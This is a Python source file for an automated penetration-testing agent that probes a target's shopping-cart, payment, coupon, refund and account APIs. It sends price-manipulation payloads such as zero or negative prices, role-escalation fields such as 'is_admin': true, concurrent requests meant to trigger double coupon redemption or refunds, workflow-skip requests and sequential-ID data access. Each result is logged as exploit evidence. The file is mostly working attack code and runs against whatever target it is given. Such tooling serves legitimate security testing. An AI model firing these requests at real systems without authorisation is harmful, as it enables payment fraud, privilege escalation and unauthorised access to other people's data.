"""META-07 BusinessLogicAgent — price manipulation, race conditions, state machine testing."""

from __future__ import annotations

import asyncio
import json
import shutil

from ..base import AgentResult, BaseAgent
from ..context import AgentContext
from ..registry import register
from ...evidence.schema import Evidence, EvidenceType, Severity
from ...graph.hypothesis import Hypothesis


@register
class BusinessLogicAgent(BaseAgent):
    agent_id = "business_logic"
    description = (
        "Business logic vulnerability testing: price manipulation, race "
        "conditions (TOCTOU), state machine bypass, workflow abuse, "
        "parameter tampering"
    )

    # Common e-commerce / business endpoints
    _BUSINESS_ENDPOINTS = [
        "/api/cart",
        "/api/checkout",
        "/api/order",
        "/api/payment",
        "/api/discount",
        "/api/coupon",
        "/api/transfer",
        "/api/account",
        "/api/subscription",
        "/api/upgrade",
        "/api/refund",
    ]

    async def run(self, context: AgentContext) -> AgentResult:
        target = context.mission.target
        findings: list[Evidence] = []
        hypotheses: list[Hypothesis] = []

        # Phase 1: Discover business logic endpoints
        endpoints = await self._discover_business_endpoints(target)
        if endpoints:
            findings.append(
                Evidence(
                    agent_id=self.agent_id,
                    title=f"Business logic endpoints on {target}",
                    severity=Severity.INFO,
                    evidence_type=EvidenceType.NETWORK,
                    description=f"Active business endpoints: {', '.join(endpoints)}",
                    response=json.dumps(endpoints, indent=2),
                    tags=["business-logic", "endpoint-discovery"],
                )
            )

        # Phase 2: Price manipulation testing
        price_findings = await self._test_price_manipulation(target, endpoints)
        findings.extend(price_findings)

        # Phase 3: Race condition testing (TOCTOU)
        race_findings = await self._test_race_conditions(target, endpoints)
        findings.extend(race_findings)

        # Phase 4: Parameter tampering
        tamper_findings = await self._test_parameter_tampering(target, endpoints)
        findings.extend(tamper_findings)

        # Phase 5: Workflow state bypass
        state_findings = await self._test_state_bypass(target, endpoints)
        findings.extend(state_findings)

        # Phase 6: IDOR (Insecure Direct Object Reference)
        idor_findings = await self._test_idor(target, endpoints)
        findings.extend(idor_findings)

        # Generate hypotheses
        if endpoints:
            hypotheses.append(
                Hypothesis(
                    title=f"Payment bypass via business logic flaw on {target}",
                    rationale="Business logic endpoints found — payment flow may be bypassable",
                    probability=0.4,
                    impact=0.95,
                    suggested_agent="business_logic",
                )
            )
            hypotheses.append(
                Hypothesis(
                    title=f"Privilege escalation via parameter tampering on {target}",
                    rationale="Business endpoints may accept role/permission parameters",
                    probability=0.5,
                    impact=0.9,
                    suggested_agent="business_logic",
                )
            )
        hypotheses.append(
            Hypothesis(
                title=f"API abuse via rate limit bypass on {target}",
                rationale="Business logic often lacks proper rate limiting",
                probability=0.6,
                impact=0.7,
                suggested_agent="dos_resilience",
            )
        )

        return AgentResult(
            agent_id=self.agent_id,
            findings=findings,
            hypotheses=hypotheses,
            status="completed",
            metadata={
                "endpoints_tested": len(endpoints),
                "critical_findings": sum(1 for f in findings if f.severity == Severity.CRITICAL),
            },
        )

    # ------------------------------------------------------------------
    # Tool helpers
    # ------------------------------------------------------------------

    async def _discover_business_endpoints(self, target: str) -> list[str]:
        if not shutil.which("curl"):
            return []
        active: list[str] = []
        for endpoint in self._BUSINESS_ENDPOINTS:
            proc = await asyncio.create_subprocess_exec(
                "curl",
                "-s",
                "-o",
                "/dev/null",
                "-w",
                "%{http_code}",
                "--max-time",
                "5",
                f"https://{target}{endpoint}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
            code = stdout.decode().strip()
            if code and code not in ("000", "404"):
                active.append(endpoint)
        return active

    async def _test_price_manipulation(
        self,
        target: str,
        endpoints: list[str],
    ) -> list[Evidence]:
        results: list[Evidence] = []
        if not shutil.which("curl"):
            return results

        price_endpoints = [
            e for e in endpoints if any(kw in e for kw in ("cart", "checkout", "order", "payment"))
        ]
        manipulation_payloads = [
            {"price": 0, "quantity": 1},
            {"price": -1, "quantity": 1},
            {"price": 0.01, "quantity": 1},
            {"amount": 0, "total": 0},
            {"discount": 100, "coupon": "FREEALL"},
        ]
        for endpoint in price_endpoints:
            for payload in manipulation_payloads:
                proc = await asyncio.create_subprocess_exec(
                    "curl",
                    "-s",
                    "-w",
                    "\n%{http_code}",
                    "--max-time",
                    "10",
                    "-X",
                    "POST",
                    "-H",
                    "Content-Type: application/json",
                    "-d",
                    json.dumps(payload),
                    f"https://{target}{endpoint}",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
                output = stdout.decode()
                lines = output.strip().split("\n")
                code = lines[-1] if lines else ""
                body = "\n".join(lines[:-1])
                # Check if server accepted manipulated price
                if code in ("200", "201") and "error" not in body.lower():
                    results.append(
                        Evidence(
                            agent_id=self.agent_id,
                            title=f"Price manipulation accepted on {endpoint}",
                            severity=Severity.CRITICAL,
                            evidence_type=EvidenceType.EXPLOIT,
                            description=(
                                f"Server accepted manipulated price/amount payload "
                                f"on {endpoint}: {json.dumps(payload)}"
                            ),
                            request=f"POST {endpoint} with {json.dumps(payload)}",
                            response=body[:1000],
                            cvss_score=9.1,
                            tags=["business-logic", "price-manipulation"],
                        )
                    )
                    break
        return results

    async def _test_race_conditions(
        self,
        target: str,
        endpoints: list[str],
    ) -> list[Evidence]:
        results: list[Evidence] = []
        if not shutil.which("curl"):
            return results

        race_endpoints = [
            e
            for e in endpoints
            if any(kw in e for kw in ("coupon", "discount", "transfer", "refund", "upgrade"))
        ]
        for endpoint in race_endpoints[:2]:
            payload = json.dumps({"code": "TEST", "action": "apply"})
            # Send concurrent requests to test TOCTOU
            tasks = []
            for _ in range(5):
                tasks.append(self._send_request(target, endpoint, payload))
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            success_count = sum(1 for r in responses if isinstance(r, str) and r in ("200", "201"))
            if success_count > 1:
                results.append(
                    Evidence(
                        agent_id=self.agent_id,
                        title=f"Potential race condition on {endpoint}",
                        severity=Severity.HIGH,
                        evidence_type=EvidenceType.EXPLOIT,
                        description=(
                            f"Concurrent requests to {endpoint} all succeeded "
                            f"({success_count}/5). This may indicate a TOCTOU race "
                            "condition allowing duplicate operations (e.g., double "
                            "coupon redemption, double refund)."
                        ),
                        response=f"{success_count}/5 concurrent requests succeeded",
                        tags=["business-logic", "race-condition", "toctou"],
                    )
                )
        return results

    async def _send_request(
        self,
        target: str,
        endpoint: str,
        payload: str,
    ) -> str:
        proc = await asyncio.create_subprocess_exec(
            "curl",
            "-s",
            "-o",
            "/dev/null",
            "-w",
            "%{http_code}",
            "--max-time",
            "10",
            "-X",
            "POST",
            "-H",
            "Content-Type: application/json",
            "-d",
            payload,
            f"https://{target}{endpoint}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
        return stdout.decode().strip()

    async def _test_parameter_tampering(
        self,
        target: str,
        endpoints: list[str],
    ) -> list[Evidence]:
        results: list[Evidence] = []
        if not shutil.which("curl"):
            return results

        tamper_payloads = [
            {"role": "admin", "is_admin": True},
            {"user_id": 1, "admin": True},
            {"price": 0, "role": "admin", "verified": True},
        ]
        for endpoint in endpoints[:3]:
            for payload in tamper_payloads[:1]:
                proc = await asyncio.create_subprocess_exec(
                    "curl",
                    "-s",
                    "-w",
                    "\n%{http_code}",
                    "--max-time",
                    "10",
                    "-X",
                    "POST",
                    "-H",
                    "Content-Type: application/json",
                    "-d",
                    json.dumps(payload),
                    f"https://{target}{endpoint}",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
                output = stdout.decode().strip()
                lines = output.split("\n")
                code = lines[-1] if lines else ""
                body = "\n".join(lines[:-1])
                if code in ("200", "201"):
                    admin_indicators = ["admin", "elevated", "role", "privilege"]
                    if any(kw in body.lower() for kw in admin_indicators):
                        results.append(
                            Evidence(
                                agent_id=self.agent_id,
                                title=f"Parameter tampering accepted on {endpoint}",
                                severity=Severity.CRITICAL,
                                evidence_type=EvidenceType.EXPLOIT,
                                description=(
                                    f"Server accepted role/permission tampering on "
                                    f"{endpoint}: {json.dumps(payload)}"
                                ),
                                request=f"POST {endpoint}",
                                response=body[:1000],
                                tags=[
                                    "business-logic",
                                    "parameter-tampering",
                                    "privilege-escalation",
                                ],
                            )
                        )
        return results

    async def _test_state_bypass(
        self,
        target: str,
        endpoints: list[str],
    ) -> list[Evidence]:
        """Test if workflow steps can be skipped."""
        results: list[Evidence] = []
        if not shutil.which("curl"):
            return results

        # Try to access later workflow stages directly
        late_stage_endpoints = [
            e
            for e in endpoints
            if any(kw in e for kw in ("checkout", "payment", "confirm", "order"))
        ]
        for endpoint in late_stage_endpoints:
            proc = await asyncio.create_subprocess_exec(
                "curl",
                "-s",
                "-w",
                "\n%{http_code}",
                "--max-time",
                "10",
                "-X",
                "POST",
                "-H",
                "Content-Type: application/json",
                "-d",
                json.dumps({"step": "final", "confirm": True}),
                f"https://{target}{endpoint}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
            output = stdout.decode().strip()
            lines = output.split("\n")
            code = lines[-1] if lines else ""
            body = "\n".join(lines[:-1])
            if code in ("200", "201") and "error" not in body.lower():
                results.append(
                    Evidence(
                        agent_id=self.agent_id,
                        title=f"Workflow state bypass possible on {endpoint}",
                        severity=Severity.HIGH,
                        evidence_type=EvidenceType.EXPLOIT,
                        description=(
                            f"Late-stage endpoint {endpoint} accepted request without "
                            "completing prior workflow steps. State machine bypass detected."
                        ),
                        request=f"POST {endpoint}",
                        response=body[:1000],
                        tags=["business-logic", "state-bypass", "workflow"],
                    )
                )
        return results

    async def _test_idor(
        self,
        target: str,
        endpoints: list[str],
    ) -> list[Evidence]:
        results: list[Evidence] = []
        if not shutil.which("curl"):
            return results

        for endpoint in endpoints[:3]:
            # Try sequential IDs
            for obj_id in [1, 2, 100, 999]:
                proc = await asyncio.create_subprocess_exec(
                    "curl",
                    "-s",
                    "-w",
                    "\n%{http_code}",
                    "--max-time",
                    "5",
                    f"https://{target}{endpoint}/{obj_id}",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
                output = stdout.decode().strip()
                lines = output.split("\n")
                code = lines[-1] if lines else ""
                body = "\n".join(lines[:-1])
                if code == "200" and len(body) > 10:
                    results.append(
                        Evidence(
                            agent_id=self.agent_id,
                            title=f"Potential IDOR on {endpoint}/{obj_id}",
                            severity=Severity.HIGH,
                            evidence_type=EvidenceType.EXPLOIT,
                            description=(
                                f"Direct object reference {endpoint}/{obj_id} returned "
                                f"data (HTTP 200). Verify if authorization is enforced."
                            ),
                            request=f"GET {endpoint}/{obj_id}",
                            response=body[:500],
                            tags=["business-logic", "idor", "access-control"],
                        )
                    )
                    break
        return results
